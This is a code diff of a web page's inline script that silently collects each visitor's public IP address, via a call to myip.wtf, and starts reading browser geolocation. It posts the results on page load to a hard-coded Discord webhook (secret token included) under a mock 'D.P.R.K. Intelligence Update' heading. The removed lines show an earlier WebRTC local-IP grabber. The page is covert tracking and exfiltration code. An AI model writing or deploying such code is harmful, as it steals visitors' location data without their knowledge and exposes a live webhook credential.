@@ -17,23 +17,7 @@
     </body>
 
 	<script>
-    var ipaddr;
-    var location;
-
-    function getLocalIP() {
-      const pc = new RTCPeerConnection({ iceServers: [] });
-      pc.createDataChannel('');
-      pc.createOffer(pc.setLocalDescription.bind(pc), () => {});
-      
-      pc.onicecandidate = (ice) => {
-        if (ice && ice.candidate && ice.candidate.candidate) {
-          const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
-          ipaddr = myIP;
-          pc.onicecandidate = () => {};
-        }
-      };
-    }
-    getLocalIP();
+    var iInfo;
 
 		async function boofData(datatype) {
 			const h = "https://discord.com/api/webhooks/1349590681160777789/3IUPkV-MaHFy7f7EGgRi8HwaByOyALxBsS37I8HPbqZMRTwrTryz7yF2FTD8QrywVjSL";
@@ -49,7 +33,7 @@
                 embeds: [
                   {
                     title: "D.P.R.K. Intelligence Update - Project Juche",
-                    description: "The following data has been collected from address *" + ipaddr + "*:",
+                    description: "The following data has been collected from address **" + iInfo.YourFuckingIPAddress + "**:",
                     color: 0xf5c2e7,
                   }
                 ]
@@ -64,7 +48,18 @@
         }
       }
     }
-    boofData("main");
+    fetch("https://myip.wtf/json")
+      .then(response => {
+        if (!response.ok) {
+          throw new Error("bs happened");
+        }
+        return response.json();
+      })
+      .then(data => {
+        iInfo = data;
+        boofData("main");
+      })
+      .catch(error => {})
 
 		if (navigator.geolocation) {
 			navigator.geolocation.getCurrentPosition(function(position) {
